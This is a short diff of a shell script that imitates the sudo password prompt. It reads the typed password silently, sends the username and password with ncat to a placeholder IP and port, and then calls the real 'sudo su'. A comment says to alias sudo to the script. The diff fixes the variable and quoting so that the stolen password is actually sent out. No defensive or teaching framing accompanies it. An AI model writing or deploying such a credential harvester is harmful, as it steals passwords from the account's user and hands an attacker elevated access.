@@ -1,6 +1,6 @@
 echo -n Password:\ 
 read -s pwd
-ncat [IP] [port] -c "echo `whoami`:$password #change IP and Port accordingly
+ncat [IP] [port] -c "echo $(whoami):$pwd #change IP and Port accordingly"
 echo
 sudo su
 #set suitable alias for sudo:
